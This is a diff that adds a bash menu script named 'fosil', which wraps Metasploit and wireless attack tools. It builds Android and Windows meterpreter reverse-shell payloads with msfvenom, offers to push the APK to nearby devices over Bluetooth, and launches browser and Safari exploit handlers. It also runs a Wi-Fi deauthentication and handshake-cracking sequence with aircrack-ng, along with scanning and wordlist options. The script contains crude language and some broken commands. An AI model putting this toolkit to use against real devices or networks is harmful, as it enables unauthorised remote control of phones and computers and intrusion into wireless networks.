@@ -1,0 +1,243 @@
+#!/bin/bash 
+clear
+sudo systemctl start postgresql
+sudo msfdb init
+clear
+ipfile="ip_file.tmp"
+on=1
+clear
+
+echo "88888888888                    8888"
+echo "88                               88"
+echo "88                               88"
+echo "88aaaaa ,adPPYba,  ,adPPYba, 88  88"
+echo "88      a8      8a  I8[      88  88"
+echo "88      8b      d8   Y8ba,   88  88"
+echo "88      8a,   ,a8  aa    ]8I 88  88"
+echo "88        YbbdP      YbbdP   88  8888"
+
+if [[ $on == 1 ]]
+then
+echo 
+echo 
+echo 
+echo 
+echo "1. Android Exploits (first)"
+echo "2. Ios Exploits (second)"
+echo "3. Wifi hacking (third)"
+echo "4. SSH into pi (fourth)"
+echo "5. Vnc Windows (fifth)"
+echo "6. Nmap (sixth)"
+echo "7. Bluetooth scanning (seventh)"
+echo "8. Network discovery (eight)"
+echo "9. Search For exploit (ninth)"
+echo "10.Download wordlist or make your own"
+echo "100.exit"
+read f
+if [[ "$f" == 'first' || "$f" == '1' || "$f" == 'android'  ]];
+ then
+ echo --Android Exploits--
+ echo "1.Browser "
+ echo "2.App-exploit"
+ read s
+
+ if [[ "$s" == 'app' || "$s" == '2'  ]];
+  then
+  echo "enter your ip address:"
+  echo "need ip address? (local) (y/n) :"
+  read i
+ 
+  if [[ "$i" == 'y' || "$i" == 'yes'  ]]; 
+      then 
+      sudo ifconfig
+      ip address
+      echo "ip address: "
+   fi
+
+    if [[ "$i" == 'n' || "$i" == 'no' ]];
+     then 
+      echo "no need for them ip addresses "
+      echo "ip address: "
+    fi
+  read ip
+  echo "app name:"
+  read name 
+    msfvenom -p android/meterpreter/reverse_tcp lhost=$ip lport=556 R> $name
+    echo "do you want to send the payload via bluethooth? (y/n) "
+    read bt
+
+    if [[ "$bt" == 'y' || "$bt" == 'Y' ]];
+     then
+     sudo hciconfig hci0 up
+     sudo btscanner hci0 
+     echo "enter the address"
+     read btad
+     bluetooth-sendto 
+    fi
+    msfconsole -r android.rc -x set lhost $ip
+fi
+
+
+if [[ "$s" == 'browser' || "$s" == '1' ]];
+ then
+ msfconsole -r browser.rc
+fi
+fi
+#60
+if [[ "$f" == 'second' || "$f" == '2' || "$f" == 'ios' ]];
+ then 
+ echo --Ios Exploits--
+ echo "1.Browser-based exploit "
+ echo "2.App-exploit (coming Soon)"
+ read c
+ if [[ "$c" == 'browser' || "$c" == '1'  ]];
+   then
+   msfconsole -r safari.rc
+#70
+  fi
+ fi
+if [[ "$f" == 'third' || "$f" == 'wifi' || "$f" == '3'  ]];
+ then
+ echo "--Wifi Exploit--"
+ sudo airmon-ng
+ echo "enter your desired card:"
+ read card
+ sudo airmon-ng start $card
+#80 
+ sudo airmon-ng stop $card
+ sudo airmon-ng check kill
+ echo "enter your card for airodump"
+ read ncard
+ sudo airodump-ng $ncard
+ echo name
+ read name
+ echo chanel
+ read chanel
+#90 
+ echo mac 
+ read mac
+ sudo airodump-ng -w $name -c $chanel --bssid $mac $ncard
+ read station 
+ sudo aireplay-ng --deauth 10 -a $mac -c $station $ncard
+ echo "wordlist path:"
+ read word
+ echo "cap file path:"
+ read cap 
+#100 
+ sudo aircrack-ng -w $word -b $mac $cap
+ service NetworkManager start
+fi
+
+if [[ "$f" == '4' || "$f" == 'fourth' || "$f" == 'raspberry' || "$f" == 'pi' ]]; 
+then
+echo "raspberry pi's address: " 
+read ras
+ping $ras -c 5
+sleep 1
+ssh root@$ras
+fi
+if [[ "$f" == '5' || "$f" == 'fifth' || "$f" == 'vnc' || "$f" == 'win' ]];
+then
+echo "ip address: "
+read $ipad
+msfvenom -p exploit/windows/meterpreter/reverse_tcp lhost= $ipad lport=24 x>vnc.exe
+msfconsole -r win_vnc.rc
+fi
+if [[ "$f" == 'Nmap' || "$f" == 'nmap' || "$f" == 'NMAP' || "$f" == '6' || "$f" == 'sixth' ]];
+ then 
+ echo "Please enter the ip/domain of the target: "
+ read target
+ echo "scan -A(-F) or -sn?"
+ read scan
+ if [[ "$scan" == '1' ]];
+  then 
+  sudo nmap -f -F -A $target
+ fi
+ if [[ "$scan" == '2' ]];
+  then
+  sudo nmap -f -sn $target
+ fi
+fi
+if [[ "$f" == 'blue' || "$f" == 'bluetooth' || "$f" == 'bt' ]];
+ then
+ sudo hciconfig hci0 up
+ sudo hciconfig
+ sudo xterm -e btscanner
+fi
+
+if [[ "$f" == '8' || "$f" == 'network' || "$f" == 'net' || "$f" == 'scan' ]];
+ then
+ netdiscover
+fi
+
+if [[ "$f" == '9' || "$f" == 'search' || "$f" == 'exploit' || "$f" == 'src' || "$f" == 'ninth' ]];
+then
+echo "please enter the exploit that you want to search for"
+read ex
+msfconsole -x search $ex
+echo "Do you want some more info about your chonsen exploit ?"
+echo "y/n"
+read cho
+if [[ $cho == "y" ]]
+ then
+ echo "the name of the exploit: "
+ $rex
+ sleep 2
+ msfconsole -x info $rex
+fi
+fi
+
+if [[ $f == "ten" || $f == "10" || $f == "wordlist" ]]
+then 
+echo "Do you want to download a wordlist or do you want to make your own?"
+echo Download/Make
+read word
+if [[ $word == "Download" || $word == "download" || $word == "1" ]]
+then
+echo "Downloading ..."
+git clone https://github.com/PoisonFeather/wordlist
+fi
+fi
+if [[ $word == "Make" || $word == "make" ||  $word == "2" ]]
+then 
+echo "please enter a minimum:"
+read minimum
+echo "please enter a maximum:"
+read max
+crunch $minimum $max
+
+
+fi
+if [[ $f == "100" || $f == "exit" ]]
+then 
+on=0
+fi 
+if [[ "$on" == 1 ]] 
+then
+./fosil
+fi
+fi
+if [[ $on == 0 ]]
+then
+sleep 2
+clear
+echo bye bitcheass
+echo
+echo
+echo
+echo
+sleep 2
+echo FoSiL BiTcHeAsS
+echo
+echo
+echo
+echo
+sudo systemctl stop postgresql
+sudo msfdb stop
+sudo msfdb delete
+echo >> ipfile
+echo >>ipfile
+date >> ipfile
+whoami >>ipfile
+sudo ifconfig  >> ipfile
+fi
